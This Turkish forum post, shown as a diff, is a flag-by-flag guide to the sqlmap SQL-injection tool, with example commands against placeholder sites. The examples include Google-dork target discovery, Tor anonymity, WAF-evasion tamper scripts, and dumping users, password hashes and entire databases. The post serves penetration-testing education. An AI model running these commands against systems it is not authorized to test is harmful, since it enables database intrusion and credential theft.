@@ -1,0 +1,717 @@
+Sqlmap nedir? Sqlmap, sql injection testleri için kullanılan ve bayağı da bir popüler olan bir uygulama. 
+Python ile yazılan Sqlmap'in genel kullanımı bu programı --dbs komutuyla değilde açık bir şekilde bilindiğindinde sql açıklarını çatır çutur hallediceksiniz.
+
+
+-h, --help:klasik basit kullanım özelliklerini yazdıran komuttur.
+
+-hh: Gelişmiş olarak yardım ve kullanım özelliklerini yazdıran bir komutumuz.
+
+-d: Veritabanına direct erişim yapabileceğimiz komuttur. Örnek olarak:
+
+sqlmap -d mysql://root assword@192.168.x.x:3306/Information_Schema
+
+ile Mysql kullanan ve verilen ip adresinin 3306 portu üzerinden, belirttiğimiz kullanıcı adı ve şifre ile information_schema bilgisinin çekilmesi işlemini yapabiliyoruz.
+
+Target sekmesi: Hedeflerin seçimini yapmamız için kullanmamız gereken parametrelerin bulunduğu kategorimiz. En azından birinin seçilmesi gerekmektedir.
+
+-u, --url: Veribanına direkt erişimimiz yoksa ve injection yolu ile deneme yapmak istiyorsak kullanabiliriz. Örnek olarak:
+
+sqlmap -u "http://www.websitesi.com/test.php?id=1"
+
+-l: Burp veya WebScarab ile çekilmiş log dosyalarını kullanarak, testler gerçekleştirmemizi sağlayan komutumuz. Örnek olarak:
+
+sqlmap -l /home/user/Desktop/log.txt
+
+x: Sitemap(.xml) dosyasını kullarak testler gerçekleştirmemizi sağlayan komutumuz. Örnek olarak:
+sqlmap -x "http://www.siteadresi.com/sitemap.xml"
+
+-m: Belirlenen txt dosyası içerisindeki linkleri satır satır deneme usulü ile testlerimizi gerçekleştirmemizi sağlayan parametremiz. Örnek olarak:
+sqlmap -m /home/user/Desktop/isim.txt
+
+
+-r: Belirlenen txt dosyası içerisinde verilmiş olan requestleri(post/get) kullanarak, testlerimizi gerçekleştirmemizi sağlayan parametrelerimiz. Örnek olarak:
+sqlmap -r /home/userDesktop/request.txt
+
+-g: Google dork ile belirli bir pattern'e sahip siteler üzerinde testler gerçekleştirmemizi sağlayan komutumuz. Örnek olarak:
+
+sqlmap -g ".php?id="
+
+-c: Sqlmap ayarlarının custom bir config.ini dosyasından yüklenmesini istiyorsak kullanacağımız komutumuz. Örnek olarak:
+
+sqlmap -c customconfig.ini -g ....
+
+Request Sekmesi: Hedef URL'e bağlantı ile ilgili yapacağımız ayarlamaları belirttiğimiz parametrelerin bulunduğu kategorimiz.
+
+--data: POST metodu ile gönderim yapılacağı zaman, gönderilecek verinin tanımlandığı kısım. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/login.php" --data="username=example&password=example&action=submit"
+
+ 
+
+
+
+--param-del: Gönderilecek değerlerin hangi değerlerden itibaren ayrılmasının belirleneceği komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/login.php" --data="username=example&password=example&action=submit" --param-del="&"
+
+--cookie: Eğer site içerisinde testler için bir cookie kullanmamız gerekiyorsa, kullanacağımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/uye.php?id=12345" --cookie="session=a235723v5sdg35"
+
+
+--cookie-del: Cookie içeriside gönderilecek değerlerin hangi değerlerden itibaren ayrılması gerektiğiin belirleneceği komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/uye.php?id=12345" --cookie="session=a235723v5sdg35" --cookie-del="&"
+
+--load-cookies: Netscape/wget formatında tanımlı dosya içerisinden cookielerin yüklenmesi amacı ile kullanılan komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/uye.php?id=12345" --load-cookies /home/user/Desktop/cookieLoader.txt
+
+--user-agent: Testlerimizde kullanacağımız User-Agent değerini kendimiz belirlemek için kullanabileceğimiz komutumuz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"
+
+--random-agent: Testlerimizde kullanacağımı User-Agent değerinin, sqlmap ile hazır gelen user-agent değerlerinin bulunduğu dosya içeriisnden random olarak atanması için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --random-agent
+
+--host: Gönderilen başlık bilgisi içerisindeki Host kısmını, request yapılacak site kısmını, istediğimiz gibi değiştirmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --host=www.siteadi.com
+
+
+--referer: Gönderilen başlık bilgisi içerisindeki Referer kısmını, hangi adres üzerinden yönlendirilme yaptığımızı (history -1 gibi), istediğimiz gibi değiştirmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --referer=www.gosterilecekAdresimiz.com
+
+--headers: Gönderilen başlık bilgisi içerisindeki diğer başlık bilgilerini (Accept-Encoding gibi), istediğimiz gibi değiştirmek amacıyla kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --headers="User-Agent: Mozilla/5.0 (X11;Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0
+
+
+--auth-type: Site üzerinde yapılacak authentication işleminin tipini belirtmek için kullanabileceğimiz parametremiz. Basic, Digest, NTLM ya da PKI gibi değerler alabilir. Örnek olarak:
+sqlmap -u "www.siteadi.com/login.php" --auth-type="Basic"
+
+--auth-cred: Site üzerinde yapılacak authentication işleminde gönderilecek veirleri tanımlamak için kullandığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/login.php" --auth-type="Basic" --authcred="username assword"
+
+--auth-private: Login işlemini pem sertifikası ile yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/login.php" --auth-type="Basic" --auth-cred="user ass" --auth-private="asd.pem"
+
+--proxy: Proxy kullanarak işlem yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak::
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --proxy="http://127.0.0.1:8080"
+
+--proxy-cred: Proxy kullanmak istiyorsak ve bağlanacağımız proxy'e ait user/pass değerleri varsa, bunları tanımlamak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --proxy="http://proxysite.com ortNumber" --proxy-cred="proxyUser roxyPass"
+
+--proxy-file: Proxy bilgilerini bir dosya içerisinden yüklemek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --proxy-file=dosyaAdi
+
+--ignore-proxy: Sisteme tanımlı default proxy ayarlarını kullanmak istemiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --ignore-proxy
+
+--tor: Tor network'ünü kullanarak gizliliğimizi sağlamak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tor
+
+--tor-port: Tor network'üne hangi port üzerinden bağlanmak istediğimizi belirtmek için kullandığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tor --tor-port=9150
+
+--tor-type: Tor ağına;HTTP, SOCKS4 ya da SOCKS5 ile hangisinden bağlanmak istiyorsak tanımlamak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tor --tor-type=SOCKS5
+
+--check-tor: Tor ağına, bağlantının sağlanıp sağlanmadığını test etmek için kullanabileceğimiz parametremiz. Eğer ağa bağlantı yoksa, geçerli sqlmap testi otomatik olarak iptal edilir. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tor --tor-type=SOCKS5 --check-tor
+
+--delay: Her bir HTTP request için aralarda beklenilecek süreyi saniye cinsinden ifade etmek amacıyla kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --delay=5
+
+ 
+
+
+
+
+--timeout:Bir bağlantının timeout olarak nitelendirilip isteğin iptal edilmesi için gerekli süreyi saniye cinsinden ayarlamak için kullanabileceğimiz parametremiz. Default değer olarak 30sn alır.
+Örnek olarak:
+sqlmap -u "www.siteadi.com/testet.php?id=1" --timeout=10
+
+--retries: Bağlantımız timeout olup iptal edildiğinde, aynı requestin kaç kere daha deneneceğini ayarlamak için kullanabileceğimiz parametremiz. Default olarak 3 değerini alır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --timeout=5 --retries=20
+
+--randomize: Verilen parametrelerin random değerlerle değiştirilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --randomize=id
+
+--safe-url: Test süresince belli bir frekansta ziyaret edilecek url adresimizi belirlemek istiyorsak kullanabileceğimiz parametremiz. Bazı sistemlerde belli bir sayıda hatalı giriş ile session sonlandırılmasını önlemek amacı ile kullanılır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --safe-url="www.siteadi.com"
+
+--safe-freq: Test süresince ziyaret edilmesini istediğimiz url'in zaman ayarını(frekansını) yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --safe-url="www.siteadi.com" --safe-freq=3
+
+--skip-urlencode: Test etmek istediğimiz parametrelerin url-encoding işleminden geçirilme işlemini atlamak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --skip-urlencode
+
+--force-ssl: SSL/HTTPS bağlantısını kullanmasını zorlamak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "https://www.siteadi.com/testet.php?id=1" --force-ssl
+
+-hpp: "HTTP Parameter Pollution" metodu ile test işlemimizi gerçekleştirmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?a=1&b=2&c=3" --hpp
+
+--eval: Belirtilen python kodunu istek yapılmadan önce çalıştırıp, ardından bu sonuca göre istek yapmak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=123&id2=456" --eval="import hashlib; id=hashlib.md5(id).hexdigest()"
+
+
+Optimization Sekmesi: Sqlmap'i performans alanında optimize etmek istiyorsak kullanabileceğimiz parametrelerin bulunduğu kategorimiz.
+
+-o: Tüm optimizasyon anahtarlarını kullanmak istiyorsak kullanabileceğimiz parametremiz. --keep-alive, --null-connection ve --threads=3 olarak default tanımlanır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -o
+
+--predict-output: txt/common_outputs.txt dosyası içerisindeki en çok karşımıza çıkan çıktıları tahmin ederek, test işlemimizin daha hızlı bitmesi konusunda yardımcı olur.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --predict-output
+
+--keep-alive: Kalıcı(persistent) HTTP(s) bağlantıları kurmak için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --keep-alive
+
+--null-connection: HTTP cevabının uzunluğunu, HTTP body'i çekmeden belirlemek için kullanılan parametremiz. Aktif edildiğinde sqlmap iki farklı NULL bağlantı tekniği ile test ve exploit işlemleri gerçekleştirir. Bunlar Range ve Head'dir. Bunlardan herhangi biri test edilen server tarafından da destekleniyorsa, işlemimizi hızlandırmamıza yardımcı olur. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --null-connection
+
+--threads: Multi-threading ile sqlmap'in maximum kaç tane HTTP(s) isteği yapabileceğini belirlemek için kullanabileceğimiz parametremiz. Özellikle bruteforce searching işlemlerinde, aramamızı oldukça hızlandıran bu yöntem, performans sebepleri gerekçesiyle max. 10 thread kullanılması tavsiye edilmekte. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --threads=10
+
+
+Injection Sekmesi: Hangi parametrelerin test edileceği, kişisel payload tanımlamaları ve tamper scriptleri tanımlamaları gibi ayarlamaları yapabileceğimiz parametrelerin bulunduğu kategorimiz.
+
+-p: Verilen parametreler içerisinde sadece belirli parametrelerin test edilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?username=asd&password=asd&denemeA=1&denemeB=2&denemeC=3" -p denemeA
+
+--skip: Verilen parametreler içerisinde sadece bazı parametrelerin test edilmesini istemiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?username=asd&password=asd&denemeA=1&denemeB=2&denemeC=3" --skip denemeA,denemeB,denemeC
+
+--dbms: Sqlmap'e yardımcı olmak adına, eğer backend'de çalışan database management system'i biliyorsak, dbms ile tanımlayabilmekteyiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbms="MySql"
+
+--os: Sqlmap'e yardımcı olmak adına, eğer işletim sistemini biliyorsak, os ile bunu da tanımlayabilmekteyiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbms="MySql" --os="Linux"
+
+--invalid-bignum: Sqlmap'in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara çok büyük sayıları da (Örn:999999) eklemek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --invalid-bignum
+
+
+ 
+
+
+
+--invalid-logical: Sqlmap'in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara Boolen denemeleri de (Örn: id=1 AND 2=5) eklemek için kullanabileceğimiz parametrelerimiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --invalid-logical
+
+--invalid-string: Sqlmap'in orjinal parametre değerlerini geçersiz kılmaya çalışırken kullandığı yollara rastgele string değerler ile (Örn: ad=xUqmnfi) eklemek için kullanabileceğimiz parametrelerimiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?ad=intelrad" --invalid-string
+
+--no-cast: Payload casting mekanizmasını kapatır ve payloadları kısaltır. Ancak default olarak gelen ayrıcalıkları tam olarak kullanamayabiliriz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --no-cast
+
+--no-escape: Test edeceğimiz server üzerinde "mysql_real_escape_string" ya da "magic_quotes" gibi ifadeler kullanılıyorsa, tek tınak gibi ifadelerimizi "SELECT char(102)+char(111)" gibi ifadelerle test edip, zamandan kazanmak için kullanabileceğimiz parametremizdir. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --no-escape
+
+--prefix: Test edilecek parametreleri, payloadların önüne istediğimiz değeri ekleyerek daha da özelleştirebileceğimiz parametremizdir.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?ad=deneme" --prefix "')"
+
+--suffix: Test edilecek parametreleri, payloadların sonuna istediğimiz değeri ekleyerek daha da özelleştirebileceğimiz parametrelerimizdir.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?ad=dememe" --suffix "')"
+
+--tamper: Eğer kullanıcı ile back-end database arasında zayıf bir giriş kontrolü varsa injection yapılacak stringleri WAF'tan geçirebilmek amacı ile kullanılan parametremiz. Önüne alacağı parametre sqlmap klasörü içerisindeki tamper klasörü içerisinden kullanılır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tamper="between"
+
+
+Detection Sekmesi: Risk ve seviye belirleme gibi, belirleme adımlarını belirlemek için kullanabileceğimiz parametrelerimizin bulunduğu kategorimiz.
+
+--level: 1 ile 5 arasında değerler alabilen parametremiz. 1. seviyede daha kısıtlı testler denetlenirken, 5.seviyede daha fazla payload, daha detaylı prefix ve suffixler ile zenginleştirilmiş payloadlar kullanılmaktadır. Ayrıca HTTP Cookie başlığı 2.seviyeden sonra ve HTTP User-Agent/Referer başlıkları da seviye 3'ten sonra denetlenmektedir. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --level=5
+
+--risk: 1 ile 3 arasında değerler alabilen parametremiz. Eğer belirtilmezse default olarak 1 değerini alır. Risk 1 daha sınırlı sql cümleleri ile denetleme yapar. Risk 2'de risk 1'in üzerine heavy-query time based saldırılar da denetlemeye tabii tutulur. Risk 3'te ise ekstradan Or-based testler de eklenir.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --risk=3
+
+--string: Sorguyu çalıştırdıktan sonra, belirlediğimiz string ile karşılaştırma yapıp, karşılaştırma varsa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --string="Kullanici"
+
+--not-string: Sorguyu çalıştırdıktan sonra, belirlediğimiz string ile karşılaştırma yapıp, karşılaştırmamız yoksa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --not-string="Kullanici"
+
+
+ 
+
+
+
+--regexp: Sorguyu çalıştırdıktan sonra, belirlediğimiz regex ifade ile karşılaştırma yapıp, karşılaştırmamız varsa True olarak dönen değeri eşleştirmek için kullandığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --regexp="[0-9]{11}"
+
+--code: HTTP sorgusu sonrası, server tarafından dönen cevaba göre (200 True ve 401 False) eşleştirmek için kullandığımız parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --code=200
+
+--text-only: CSS,JS gibi tagleri göz ardı ederek, sadece metin içeriğine göre sayfaları karşılaştırmak için kullanabileceğimiz parametremiz. Örnek olarak:
+sqlmap -u "www.siteadi.com/testet.php?id=1" --text-only
+
+
+--titles: Sadece website başlığı baz alınarak sayfaları karşılaştırmak için kullanabileceğimiz parametremizÖrnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --titles
+
+
+Techniques Sekmesi: Kullanılacak SQL Injection tekniklerini belirlemek için kullanacağımız parametrelerimizin bulunduğu kategorimiz.
+
+--technique: Kullanılacak SQL Injection tekniklerini belirlediğimiz parametremiz. Default olarak BEUSTQ ( Bool-Based Blind, Error-Based, Union-Query Based, Stacked Query, Time-Based Blind, Inline Queries). Ancak bunlardan sadece bazılarının test için kullanılmasını istiyorsak o zaman örnek kullanımımız aşağıdaki gibi olmakta. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --technique="BEST"
+
+--time-sec: DBMS cevabının gecikmesi için belirlenen süreyi tanımlayabileceğimiz parametremiz. Default olarak 5 tanımlıdır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --time-sec=10
+
+--union-cols: Default olarak sqlmap, UNION query'ler için 1'den 10'a kadarlık kolonlarda deneme yapar. Level değerini değiştirerek 50 kolona kadar çıkarabilsek de biz sadece bunu değiştirmek istiyorsak bu parametreyi kullanabiliriz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --union-cols=1-50
+
+--union-char: Default olarak sqlmap, UNION query'ler için NULL kullanır ve denemelerini bu koşul ile yapar. Level değerini değiştirerek NULL dışında random sayılarla da testler gerçekleştirse de sadece bu değeri manuel olarak değiştirmek istiyorsak bu parametreyi kullanabiliriz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --union-char 2013
+
+--union-from: Sql injection için UNION query'de FROM kısmında kullanılacak tabloyu belirtmemiz (daha çok zorlamak olarak da düşünülebilir) için kullanabileceğimiz parametremizdir. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --union-from=tabloIsmi
+
+--dns-domain: Eğer test eden(biz), bir domain server'a sahipsek, blind-injection saldırıları hızlandırmak için kullanabileceğimiz parametremiz. Açıklaması çok uzun ve detaylı olduğu için buradan açıklanmayacak. 53 numaralı portu kullandığı için, sudo yetkisi ile çalıştırmamız gerekmektedir. Parametrenin kullanım örneği aşağıdaki gibidir:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dns-domain saldirganadam.com
+
+--second-order: Eğer inject ettiğimiz payload'ın sonucu bir başka sayfada gösteriliyorsa kullanabileceğimiz parametremizdir.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --second-order
+
+
+Fingerprint Sekmesi: Veritabanı yönetim sistemi belirleme sistemleri için kullanılan parametrelerin bulunduğu kategorimiz.
+
+-f ya da --fingerprint: Default olarak sqlmap, veritabanı sisteminin fingerprint'ini bize döndürebilmekte. Eğer daha detaylı bir arama yapmak istiyorsak kullanabileceğimiz parametremiz. Bu parametre ile birlikte sqlmap gerçek DBMS version bilgisini, eğer mümkünse işletim sistemi, mimarisi gibi bilgileri de bize döndürmeye çalışacaktır. Eğer daha doğru sonuçlara ulaşmak istiyorsak, bunun yanında -b ya da --banner parametrelerini de kullanabiliriz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -f
+
+Enumeration Sekmesi: Veritabanı yönetim sistemi hakkında bilgilendirme için kullanacağımız parametrelerin bulunduğu kategorimiz. Tablo içerisindeki verileri çekme, bilgi alma amacıyla kullanılır.
+
+--all: Allah Ne Verdiyse modu. Çekebileceği her türlü veriyi çeker. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --all
+
+-b ya da --banner: Veritabanının içerisinde bulunduğu işletim sistemi, veritabanı sürümü gibi bilgileri çekmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -b
+
+--current-user: Veritabanı yönetim sisteminin, backend DBMS'ten web uygulamasına sorgu gerçekleştiren kullanıcısını bulmak için kullanabileceğimiz parametremiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --current-user
+
+--current-db: Web uygulamamamızın bağlı olduğu veritabanı ismini çekmek için kullanabileceğimiz parametremiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --current-db
+
+--hostname: Ana bilgisayarımızın(host) ismini döndürür.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --hostname
+
+--is-dba: Çektiğimiz kullanıcının veritabanı admini(Database Admin) olup olmadığını sorgulamak için kullanabileceğimiz parametremiz. Eğer admin ise true, değilse false değer döner. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --is-dba
+
+--users: Veritabanı yönetim sistemi kullanıcılarını listelemek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --users
+
+--passwords: Eğer geçerli userın, sistem tablolarını okuma izni var ise, şifreleri hash olarak çekmemize yardımcı olur. Sqlmap bu işlem için önce kullanıcıları çeker. Ardından pass hashlerini çekmeye çalışır. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --passwords
+
+--privileges: Eğer geçerli userın, sistem tablolarını okuma izni var ise, veritabanı üzerindeki kullanıcıların yetki düzeylerini bize veren parametremiz.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --privileges
+
+--roles: Eğer geçerli userın, sistem tablolarını okuma izni var ise, veritabanı üzerindeki kullanıcıların rollerini çekmek için kullanabileceğimiz parametremiz. Sadece veritabanı, ORACLE ise çalışacaktır.Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --roles
+
+--dbs: Eğer geçerli userın, sistem tablolarını okuma izni var ise, veritabanı isimlerini çekebilmemize yarayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs
+
+--tables: Eğer geçerli userın, sistem tablolarını okuma izni var ise, seçtiğimiz veritabanı içerisindeki tüm tabloları çekebilmemize yarayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --tables
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniadi --tables
+
+--columns: Eğer geçerli userın, sistem tablolarını okuma izni var ise, seçtiğimiz veritabanı içerisindeki seçtiğimiz tablodaki tüm kolonları çekmemize yarayan parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --columns
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi --columns
+
+--schema: Eğer geçerli userın, sistem tablolarını okuma izni var ise, seçtiğimiz sistemin tablolarını ve değişken tiplerini tablolar halinde çıktı göstermek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --schema
+
+--count: Eğer veritabanları, tablolar ya da kolonlar içerisindeki kayıt sayısını öğrenmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --count -D veritabaniAdi
+sqlmap -u "www.siteadi.com/testet.php?id=1" --count -D veritabaniAdi -T tabloAdi
+
+--dump: Veritabanımız ya da tablomuzun içeriğini dump etmek istiyorsak, kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi --dump
+
+--dump-all: Veritabanları ya da tabloların hepsini dump etmek istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dump-all
+
+
+ 
+
+
+
+--search: Veritabanları, tablolar ya da kolonları aramak için kullanabileceğimiz parametremiz.
+Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --search -T bunuAra
+
+--comments: Veritabanı için tanımlı comment'leri çekmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --comments
+
+-D: Veritabanlarını doğru bir şekilde çekebildiğimiz takdirde, hangi veritabanını kullanarak işleme devam etmek istediğimizi belirtmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi
+
+-T: Tabloları doğru bir şekilde çekebildiğimiz takdirde, hangi tabloyu kullanarak işleme devam etmek istediğimizi belirtmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi
+
+-C: Kolonları doğru bir şekilde çekebildiğimiz takdirde, hangi kolonu/kolonları kullanarak işleme devam etmek istediğimizi belirtmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi -C kolonAdi1,kolonAdi2,kolonAdi3 --dump
+
+-X: Kolonları doğru bir şekilde çekebildiğimiz takdirde, hangi kolonu/kolonları çekmek istemediğimizi tanımlayabileceğimizi belirtmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi -X istenmeyenKolon --dump
+
+-U: Userları doğru bir şekilde çekebildiğimiz takdirde, hangi userı kullanarak işleme devam etmek istediğimizi belirtmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -U username
+
+--exclude-sysdbs: System database'lerini injection testlerimiz içerisinde kullanmak istemiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --exclude-sysdb --dbs
+
+--where:Tablolarımızı dump ederken WHERE sorgusu kullanarak dump etmek için kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.site.com/testet.php?id=1" -D db -T tbl --where="category_id=1"
+
+--------------------------------------------------------------------------------------
+Teşekkür :RpS_razz:
+--------------------------------------------------------------------------------------
+
+Son düzenleme: 14 Ağu 2017
+ 
+sevban035
+Katılımcı Üye
+ 
+18 Tem 2012
+687
+3
+kaf
+•	9 Nis 2017
+•	
+•	#2
+--eta: Eğer test ettiğimiz sitemiz üzerinde açık varsa ve bu açıkları kullanarak dump işlemi gerçekleştirebiliyorsak, kalan zamanı öğrenebileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db -T tbl --columns --eta
+
+--flush-session: Eğer test ettiğimiz sitemiz üzerindeki session kayıtlarını temizlemek ve yeni bir kayda başlamak istiyorsak, kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --flush-session
+
+--forms: Eğer test ettiğimiz site üzerindeki test edilen kısım, bir form ise, bunu tanımlayıp form üzerinde test işlemimizi devam ettirebileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/register.php?id=1" --dbs --forms
+
+--fresh-queries: Test ettiğimiz site üzerinde daha önce denediğimiz ve session içinde kayıtlı bulunan query cevaplarını, session dosyasını görmezden görerek tekrardan denemek istiyorsak kullanmamız gereken parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" -D db --tables --fresh-queries
+
+--hex: Test ettiğimiz site üzerinden gelen verileri DBMS hex fonksiyonlarını kullanarak tanımlamak istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs --hex
+
+--output-dir: Sqlmap ile denetlediğimiz site üzerinden gelen bilgileri dump edeceğimiz yeri default path yerine, kendi belirlediğimiz path'e kaydedilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
+sqlmap -u "www.siteadi.com/testet.php?id=1" --output-dir /kaydedilecek/yolumuz/kaydet.txt
+
+--parse-errors: Sqlmap ile sorgu yaparak denediğimiz sitemiz üzerinden gelen cevaplar içerisindeki DBMS hata mesajlarını parse edip gösterilmesini istiyorsak kullanabileceğimiz parametremiz. Örnek olarak:
+
